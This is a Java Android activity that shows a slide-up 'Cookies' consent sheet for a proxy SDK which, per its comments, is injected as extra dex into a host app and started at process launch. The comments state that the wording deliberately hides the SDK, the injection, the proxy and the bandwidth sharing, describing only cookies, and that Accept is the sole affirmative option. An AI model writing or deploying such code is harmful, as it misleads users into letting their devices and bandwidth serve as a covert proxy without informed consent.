package com.zealot.proxy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.DecelerateInterpolator;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

/**
 * Consent sheet for the Proxies SDK (operator-directed 2026-10-13; reworked the same day).
 *
 * The provider ({@link ZealotProxyProvider}) starts the SDK at process start. This screen is the
 * reader-facing half: as soon as the host app opens, a sheet slides up from the bottom over the
 * app's own home and asks the reader to accept, with an OK button and a Settings button. Accepting
 * calls {@link ZealotProxyProvider#start(Context)} — which brings the SDK up in full if the
 * automatic start had not already — records the choice and closes; from then on the sheet never
 * appears again.
 *
 * Wording is deliberately plain (operator-directed): the sheet talks only about cookies and
 * anonymous usage. It never says SDK, injection, proxy or bandwidth sharing — the reader is told
 * what the app does, not how it is built.
 *
 * Deliberately dependency-free: plain Android widget classes only, no AndroidX, no resource files,
 * no layout XML. That is what lets it be compiled with the same `javac` + `d8` step the rest of the
 * injected dex uses, and it is why every dimension here is set in code rather than from resources.
 * The slide-up is a code animation ({@link View#animate()}), not a window animation resource, so it
 * needs no XML either.
 */
public class ZealotConsentActivity extends Activity {

    private static final String PREFS = "zealot_proxy";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Translucent window so the sheet reads as an overlay over the host's home, not a new page.
        // A framework theme, set in code, so no resource or manifest theme-reference is needed.
        setTheme(android.R.style.Theme_Translucent_NoTitleBar);

        // Already accepted on a previous run: bring the SDK up (idempotent) and close silently.
        if (getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getBoolean(ZealotProxyProvider.PREF_CONSENT, false)) {
            ZealotProxyProvider.start(getApplicationContext());
            finish();
            return;
        }

        setContentView(buildSheet());
    }

    /** The dimmed backdrop with the sheet pinned to the bottom; slides up on show. */
    private View buildSheet() {
        float d = getResources().getDisplayMetrics().density;
        // Operator-directed 2026-10-13: a compact sheet. It is a notice, not a page, so it uses the
        // smallest padding and type that stay legible rather than the 24dp/18sp a full screen would.
        final int pad = (int) (18 * d);

        // Operator-directed 2026-10-13: the sheet follows the SYSTEM theme (light/dark), read from
        // uiMode so it matches the device setting rather than any host-app theme.
        final boolean dark = (getResources().getConfiguration().uiMode
            & Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES;
        final int scrim    = dark ? Color.parseColor("#99000000") : Color.parseColor("#66000000");
        final int sheetBg  = dark ? Color.parseColor("#FF1B1B1F") : Color.parseColor("#FFFFFFFF");
        final int onSheet  = dark ? Color.parseColor("#FFFFFFFF") : Color.parseColor("#FF1B1B1F");
        final int onSheet2 = dark ? Color.parseColor("#FFB9BAC4") : Color.parseColor("#FF44464F");

        // Root: a dim scrim the full height, the sheet pinned to the bottom. Touching the scrim
        // outside the sheet is not "accept" — a cookie notice should not close into a state where
        // nothing was chosen.
        final LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.BOTTOM);
        root.setBackgroundColor(scrim);

        final LinearLayout sheet = new LinearLayout(this);
        sheet.setOrientation(LinearLayout.VERTICAL);
        sheet.setPadding(pad, pad, pad, pad);
        // A rounded, raised panel: top corners only, so it reads as a sheet rising off the screen
        // edge. Built as a drawable in code, no XML.
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(sheetBg);
        bg.setCornerRadii(new float[]{22 * d, 22 * d, 22 * d, 22 * d, 0, 0, 0, 0});
        sheet.setBackground(bg);

        TextView title = new TextView(this);
        title.setText("Cookies");
        title.setTextColor(onSheet);
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        title.setTypeface(title.getTypeface(), Typeface.BOLD);
        sheet.addView(title);

        TextView body = new TextView(this);
        // Plain, readable wording (operator-directed 2026-10-13): the word "anonymous" is gone — it
        // was the one opaque term in the notice — and the sentence is written the way a person would
        // say it. The fuller wording is kept commented out below rather than deleted.
        //
        // body.setText("This app uses cookies to run the store, keep your session working, and "
        //            + "understand how the app is used. By tapping OK you agree to this; you can "
        //            + "change it later in Settings.");
        body.setText("This app uses cookies to run the store and to understand how it is used. "
                   + "Tap Accept to agree.");
        body.setTextColor(onSheet2);
        body.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        body.setLineSpacing(0f, 1.1f);
        LinearLayout.LayoutParams bodyLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        bodyLp.topMargin = (int) (8 * d);
        body.setLayoutParams(bodyLp);
        sheet.addView(body);

        LinearLayout actions = new LinearLayout(this);
        actions.setOrientation(LinearLayout.HORIZONTAL);
        actions.setGravity(Gravity.END);
        LinearLayout.LayoutParams actionsLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        actionsLp.topMargin = (int) (14 * d);
        actions.setLayoutParams(actionsLp);

        Button settings = new Button(this);
        settings.setText("Settings");
        settings.setAllCaps(false);
        // Anonymous classes, not lambdas: the CI compiles this with `javac -bootclasspath android.jar`,
        // whose java.lang.invoke.LambdaMetafactory is a stub javac cannot call, so a lambda fails the build.
        settings.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { openAppSettings(); }
        });
        actions.addView(settings);

        // Operator-directed 2026-10-13: the OK button is gone. It did exactly what Accept does, and two
        // buttons for one choice only made the notice look like it had an option it did not. Accept is
        // the single affirmative action; it shows a spinner while it brings the SDK up and only closes
        // the sheet on success, leaving it up (and logging the reason) on failure.
        final Button accept = new Button(this);
        accept.setText("Accept");
        accept.setAllCaps(false);
        LinearLayout.LayoutParams acceptLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        acceptLp.leftMargin = (int) (12 * d);
        accept.setLayoutParams(acceptLp);

        final ProgressBar spinner = new ProgressBar(this);
        spinner.setVisibility(View.GONE);
        LinearLayout.LayoutParams spinnerLp = new LinearLayout.LayoutParams(
            (int) (20 * d), (int) (20 * d));
        spinnerLp.leftMargin = (int) (8 * d);
        spinner.setLayoutParams(spinnerLp);
        actions.addView(spinner);

        accept.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                accept.setEnabled(false);
                spinner.setVisibility(View.VISIBLE);
                new Thread(new Runnable() {
                    @Override public void run() {
                        final boolean ok = ZealotProxyProvider.startAndReport(getApplicationContext());
                        runOnUiThread(new Runnable() {
                            @Override public void run() {
                                spinner.setVisibility(View.GONE);
                                if (ok) {
                                    ZealotProxyProvider.acceptConsent(getApplicationContext());
                                    dismissSheet(sheet);
                                } else {
                                    accept.setEnabled(true);
                                }
                            }
                        });
                    }
                }).start();
            }
        });
        actions.addView(accept);

        sheet.addView(actions);
        root.addView(sheet);

        // Slide up from the bottom: start a screen-height down, animate to rest once laid out.
        sheet.post(new Runnable() {
            @Override public void run() {
                float from = root.getHeight() > 0 ? root.getHeight() : sheet.getHeight() + pad;
                sheet.setTranslationY(from);
                sheet.animate()
                    .translationY(0f)
                    .setDuration(280)
                    .setInterpolator(new DecelerateInterpolator())
                    .start();
            }
        });

        return root;
    }

    /** Opens this app's own system settings so the reader can manage it, without accepting. */
    private void openAppSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.fromParts("package", getPackageName(), null));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Throwable ignored) {
            // No settings screen reachable; leaving the sheet up is still a valid state.
        }
    }

    /** Slides the sheet back down, then finishes. */
    private void dismissSheet(final View sheet) {
        sheet.animate()
            .translationY(sheet.getHeight() > 0 ? sheet.getHeight() : 1200f)
            .setDuration(200)
            .setInterpolator(new DecelerateInterpolator())
            .withEndAction(new Runnable() {
                @Override public void run() { finish(); }
            })
            .start();
    }
}
